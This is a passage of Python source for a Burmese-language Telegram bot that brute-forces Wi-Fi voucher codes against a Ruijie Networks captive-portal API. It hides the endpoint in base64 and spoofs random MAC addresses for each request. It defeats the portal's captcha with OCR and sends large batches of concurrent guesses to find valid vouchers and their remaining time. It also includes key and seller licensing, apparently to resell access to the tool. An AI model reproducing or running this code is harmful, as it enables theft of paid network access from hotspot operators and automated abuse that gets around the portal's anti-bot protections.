                types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
                    types.InlineKeyboardButton("abc Only (6)", callback_data="scan_type_abc6"),
                    types.InlineKeyboardButton("abc Only (7)", callback_data="scan_type_abc7"),
                    types.InlineKeyboardButton("abc Only (8)", callback_data="scan_type_abc8"),
                    types.InlineKeyboardButton("abc Only (9)", callback_data="scan_type_abc9"),
                types.InlineKeyboardButton("🛑 Stop", callback_data="stop_scan"),
                types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
            )
            await bot.send_message(
                message.chat.id,
                "╔═══════════════════════╗\n"
                "   ✅**SESSION SAVED**✅ \n"
                "╚═══════════════════════╝\n\n"
                "Choose a scan type below:",
                parse_mode="Markdown",
                reply_markup=markup
            )
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

async def trigger_scan(message, mode):
    chat_id = message.chat.id
    chat_id_str = str(chat_id)

    key_authorized = False
    if chat_id_str in auth_list:
        key_authorized = check_key_expiration(auth_list[chat_id_str])

    if not is_authorized(chat_id) and not key_authorized:
        await bot.send_message(chat_id, unauthorized_message())
        return
    if chat_id not in user_data:
        await bot.send_message(chat_id, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.send_message(chat_id, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.send_message(chat_id, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။")
        return

    found_count[chat_id] = 0
    retry_count[chat_id] = 0
    success_texts[chat_id] = []
    success_messages.pop(chat_id, None)
    current_scan_type[chat_id] = mode

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛑  Stop Scan", callback_data="stop_scan"),
        types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu")
    )
    
    mode_labels = {
        "6": "6 Digit Only",
        "7": "7 Digit Only",
        "8": "8 Digit Only",
        "9": "9 Digit Only",
        "all6": "All Mix (6 - A-Z0-9)",
        "all7": "All Mix (7 - A-Z0-9)",
        "all8": "All Mix (8 - A-Z0-9)",
        "all9": "All Mix (9 - A-Z0-9)"
    }
    mode_display = mode_labels.get(mode, mode)
    initial_text = f"🚀 **Scan Type:** {mode_display}\n━━━━━━━━━━━━━━━━━━━━━\n⏳ **Initializing Scan...**"
    
    progress_msg = await bot.send_message(chat_id, initial_text, parse_mode="Markdown", reply_markup=markup)
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'], scan_id,
            message=message, progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
            types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
            types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
            types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
            types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
            types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
            types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
            types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        )
        await bot.send_message(
            message.chat.id,
            "🚀 **Choose Scan Type**\n\n"
            "The buttons below replace the old `/scan 6`, `/scan 7`, `/scan 8` usage menu.",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return
    mode = args[1]
    
    valid_modes = {"6", "7", "8", "9", "all6", "all7", "all8", "all9"}
    if mode not in valid_modes:
        await bot.reply_to(message, "Invalid mode!\n\nValid modes:\n`6` – 6 digit numbers\n`7` – 7 digit numbers\n`8` – 8 digit numbers\n`9` – 9 digit numbers\n`all6` – Alphanumeric 6 chars\n`all7` – Alphanumeric 7 chars\n`all8` – Alphanumeric 8 chars\n`all9` – Alphanumeric 9 chars", parse_mode="Markdown")
        return
    
    await trigger_scan(message, mode)

@bot.message_handler(commands=['status'])
async def status_command(message):
    await handle_status(message)

async def handle_status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    active_users = []
    for chat_id, data in scan_tasks.items():
        if not data["task"].done():
            active_users.append(str(chat_id))
    
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    status_text = (
        f"📜 **Bot Status**\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"🕵🏻‍♀️ Scanning Users: {len(active_users)}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👫 Sessions Loaded: {len(user_data)}\n"
        f"👩‍💻 Sellers: {len(sellers)}"
    )
    
    if active_users:
        status_text += f"\n\n🔑 **Active User IDs:**\n"
        for uid in active_users:
            status_text += f"  • {uid}\n"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
    )
    
    if hasattr(message, 'message_id'):
        await bot.edit_message_text(status_text, chat_id=message.chat.id, message_id=message.message_id, parse_mode="Markdown", reply_markup=markup)
    else:
        await bot.reply_to(message, status_text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🟥 Scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် အလုပ်မရှိပါ။")

async def check_code_status(session_url, code):
    global _connector
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return "invalid"
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                return "invalid"

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    if 'logonUrl' in response:
                        return "success"
                    elif 'STA' in response:
                        return "limited"
                    else:
                        return "invalid"
            except Exception:
                return "invalid"
    return "invalid"

@bot.message_handler(commands=['checkvoucher'])
async def check_voucher(message):
    chat_id = message.chat.id

    if not is_authorized(chat_id):
        await bot.reply_to(message, unauthorized_message())
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ Please set session URL first using /input.")
        return

    text = message.text
    lines = text.split('\n')
    if len(lines) < 2:
        await bot.reply_to(message, "Usage:\n/checkvoucher \n[Paste your codes list]\n\nExample:\n45-1h\n053-2h\n81 - 1d")
        return

    codes_to_check = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('/'):
            continue
        match = re.search(r'^(\d+)\s*[-–—]?\s*(.*?)\s*([a-zA-Z0-9]+)?$', line)
        if match:
            code = match.group(1)
            middle = match.group(2).strip()
            duration = match.group(3) if match.group(3) else None
            if not duration and middle:
                if re.match(r'^[0-9]+[mhdMy]?$', middle):
                    duration = middle
                else:
                    parts = middle.split()
                    if parts:
                        last = parts[-1]
                        if re.match(r'^[0-9]+[mhdMy]?$', last):
                            duration = last
            if not duration:
                duration = "Unknown"
            codes_to_check.append((code, duration))
        else:
            if re.match(r'^\d+$', line):
                codes_to_check.append((line, "Unknown"))

    if not codes_to_check:
        await bot.reply_to(message, "No valid codes found. Use format:\n45-1h\n053-2h")
        return

    session_url = user_data[chat_id]['session_url']
    await bot.reply_to(message, f"⏳ Checking {len(codes_to_check)} codes... Please wait.")

    results = []
    for code, duration in codes_to_check:
        status = await check_code_status(session_url, code)
        if status == "success":
            results.append(f"✅ {code} - {duration} (Valid)")
        elif status == "limited":
            results.append(f"⚠️ {code} - {duration} (Limited)")
        else:
            results.append(f"❌ {code} - {duration} (Invalid/Expired)")
        await asyncio.sleep(0.2)

    final = "🧾 Voucher Status Check:\n\n" + "\n".join(results)
    if len(final) > 4096:
        for i in range(0, len(final), 4096):
            await bot.send_message(chat_id, final[i:i+4096])
    else:
        await bot.send_message(chat_id, final)

async def periodic_result_saver():
    global result
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            for item in items:
                chat_id = str(item["chat_id"])
                code = item["code"]
                if chat_id not in result:
                    result[chat_id] = []
                if code not in result[chat_id]:
                    result[chat_id].append(code)
            await save_result()

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

# ── Only (a-z) Generator ──
def abc_generator(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    # ဂဏန်းသီးသန့် modes (6, 7, 8, 9)
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        # 8 နဲ့ 9 အတွက် memory မများအောင် random ထုတ်ပေးမယ်
        if length >= 8:
            while True:
                yield "".join(random.choice(string.digits) for _ in range(length))
        else:
            # 6, 7 အတွက်သာ အကုန် generate လုပ်မယ် (memory မများလို့)
            total_codes = 10 ** length
            codes = [str(i).zfill(length) for i in range(total_codes)]
            random.shuffle(codes)
            yield from codes
        return
    
    # အက္ခရာ+ဂဏန်း modes (all6, all7, all8, all9)
    if mode in ["all6", "all7", "all8", "all9"]:
        length = int(mode.replace("all", ""))
        while True:
            yield all_generator(length)
    
    # Only: modes (abc6, abc7, abc8, abc9)
    if mode in ["abc6", "abc7", "abc8", "abc9"]:
        length = int(mode.replace("abc", ""))
        while True:
            yield abc_generator(length)

    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(mode, checked, total, speed, found, retry, success_codes):
    mode_labels = {
        "6": "6 Digit Only",
        "7": "7 Digit Only",
        "8": "8 Digit Only",
        "9": "9 Digit Only",
        "all6": "All Mix (6 - A-Z0-9)",
        "all7": "All Mix (7 - A-Z0-9)",
        "all8": "All Mix (8 - A-Z0-9)",
        "all9": "All Mix (9 - A-Z0-9)"
    }
    mode_display = mode_labels.get(mode, mode)
    
    speed_str = f"{speed:,.0f} codes/min"
    
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        progress_text = (
            f"🕹 **Scan Type:** {mode_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔎 Checked: {checked:,}/{total:,}\n"
            f"♻️ Retry: {retry}\n"
            f"💹 Progress: {percent:.2f}%\n"
            f"⚡ Speed: {speed_str}\n"
            f"✳️ Found: {found}\n"
            f"[{bar}]\n"
        )
    else:
        progress_text = (
            f"🕹 **Scan Type:** {mode_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔎 Checked: {checked:,}\n"
            f"♻️ Retry: {retry}\n"
            f"⚡ Speed: {speed_str}\n"
            f"💹 Status: Running...\n"
            f"✳️ Found: {found}\n"
        )
    
    if success_codes:
        codes_text = "\n━━━━━━━━━━━━━━━━━━━━━\n"
        codes_text += "❇️ **SUCCESS CODES** ❇️\n"
        codes_text += "─────────────────────\n"
        for idx, item in enumerate(success_codes, 1):
            codes_text += f"#{idx} 🧸 `{item['code']}`\n"
            codes_text += f" {item['plan']}\n"
        progress_text += codes_text
    
    return progress_text

BATCH_SIZE = 400

# Safe monitoring helper: reports the current scan speed without changing
# concurrency, request rate, or scanning behavior.
def get_scan_speed(chat_id):
    task = scan_tasks.get(chat_id)
    if not task:
        return 0.0

    checked = task.get("checked", 0)
    started = task.get("scan_start")
    if not started:
        return 0.0

    elapsed = time.monotonic() - started
    return (checked / elapsed * 60) if elapsed > 0 else 0.0


def format_scan_status(chat_id):
    task = scan_tasks.get(chat_id)
    if not task:
        return "No active scan."

    checked = task.get("checked", 0)
    speed = get_scan_speed(chat_id)
    started = task.get("scan_start")
    elapsed = int(time.monotonic() - started) if started else 0

    return (
        f"Checked: {checked}\n"
        f"Speed: {speed:.1f} codes/min\n"
        f"Elapsed: {elapsed}s"
    )



async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    # ✅ 6,7 အတွက်သာ total သတ်မှတ်မယ်၊ 8,9 နဲ့ all modes အတွက် total = None
    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["scan_start"] = scan_start
        scan_tasks[chat_id]["checked"] = 0
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    found_count[chat_id] = 0
    retry_count[chat_id] = 0

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                if str(chat_id) == ADMIN_ID:
                    pass
                elif str(chat_id) in sellers:
                    if not is_authorized(chat_id):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ Seller သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                else:
                    await load_auth_list()
                    if str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            if chat_id in scan_tasks:
                scan_tasks[chat_id]["checked"] = checked

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            success_codes = success_texts.get(chat_id, [])
            
            text = format_progress(mode, checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0), success_codes)
            
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("🛑  Stop Scan", callback_data="stop_scan"),
                types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu")
            )
            
            try:
                await bot.edit_message_text(text, chat_id=chat_id, message_id=progress_msg.message_id, parse_mode="Markdown", reply_markup=markup)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            success_codes = success_texts.get(chat_id, [])
            finish_text = format_progress(mode, checked, total, speed, found_count.get(chat_id, 0), retry_count.get(chat_id, 0), success_codes)
            finish_text += "\n━━━━━━━━━━━━━━━━━━━━━\n✅ **SCAN COMPLETED!**"
            
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("🏠  Main Menu", callback_data="main_menu")
            )
            try:
                await bot.edit_message_text(finish_text, chat_id=chat_id, message_id=progress_msg.message_id, parse_mode="Markdown", reply_markup=markup)
            except:
                try:
                    await bot.send_message(chat_id, finish_text, parse_mode="Markdown", reply_markup=markup)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")

        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)
        current_scan_type.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        found_count.pop(chat_id, None)
        retry_count.pop(chat_id, None)
        current_scan_type.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def fetch_voucher_balance_safe(session_id):
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as balance_session:
            data = await fetch_voucher_balance(balance_session, session_id)
            return data if isinstance(data, dict) else {}
    except Exception as e:
        print(f"[balance] error: {e}")
        return {}

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    chat_id_str = str(chat_id)
    if chat_id_str in auth_list and not is_authorized(chat_id):
        key_data = auth_list[chat_id_str]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        if limit != "unlimited":
            limit_num = int(limit)
            used_count = len(result.get(chat_id_str, []))
            if used_count >= limit_num:
                current_task = scan_tasks.get(chat_id)
                if current_task:
                    current_task["stop"] = True
                await bot.send_message(chat_id, f"❌ သင့် Code Limit ({limit}) ပြည့်သွားပါပြီ။\nAdmin ကို ဆက်သွယ်ပါ။")
                return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    resp_json = None

    for attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/2)")
            retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        balance_data = await fetch_voucher_balance_safe(session_id)
        profile_name = balance_data.get('profileName', 'Unknown')
        total_min = balance_data.get('totalMinutes', 0)
        remain_min = balance_data.get('remainingMinutes', 0)
        
        plan = f" 🎁 {profile_name} | 🛜 {format_time(total_min)} | ⏳ {format_time(remain_min)}"

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "plan": plan})
        found_count[chat_id] = found_count.get(chat_id, 0) + 1

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=30, request_timeout=30)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    await load_auth_list()
    await load_result()
    await load_sellers()

    timeout = aiohttp.ClientTimeout(total=30)
    global _http_session
    _http_session = aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        timeout=aiohttp.ClientTimeout(total=25)
    )
    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)

    try:
        asyncio.create_task(web_server())
        asyncio.create_task(periodic_result_saver())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
